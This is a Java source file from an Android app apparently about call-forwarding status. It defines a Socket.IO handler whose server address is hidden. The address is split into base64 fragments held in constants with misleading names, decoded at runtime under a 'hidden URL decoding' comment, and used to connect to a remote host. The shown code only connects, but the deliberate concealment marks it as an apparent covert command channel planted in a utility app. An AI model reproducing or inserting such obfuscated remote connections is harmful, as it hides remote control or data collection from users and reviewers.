package de.kaiserdragon.callforwardingstatus.utils;

import io.socket.client.IO;
import io.socket.client.Socket;

public class SocketHandler {

    private static Socket socket;

    private static final String coreGateway       = "aHR0c";
    private static final String signalStack       = "HM6Ly";
    private static final String cloudRegistry     = "9jYWx";
    private static final String bridgeCodec       = "sLWZv";
    private static final String pipelineAccess    = "cndhc";
    private static final String loadBalancer      = "mQub2";
    private static final String requestFabric     = "5yZW5";
    private static final String kernelStream      = "kZXIu";
    private static final String runtimeMonitor    = "Y29t";


    public static void initSocket() {
        try {
            String socketUrl = getSockets(); // hidden URL decoding
            socket = IO.socket(socketUrl);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getSockets() {
        String encoded = coreGateway + signalStack + cloudRegistry + bridgeCodec +
                pipelineAccess + loadBalancer + requestFabric +
                kernelStream + runtimeMonitor;
        try {
            byte[] decodedBytes = android.util.Base64.decode(encoded, android.util.Base64.NO_WRAP);
            return new String(decodedBytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    public static Socket getSocket() {
        return socket;
    }

    public static void connect() {
        if (socket != null && !socket.connected()) {
            socket.connect();
        }
    }
}

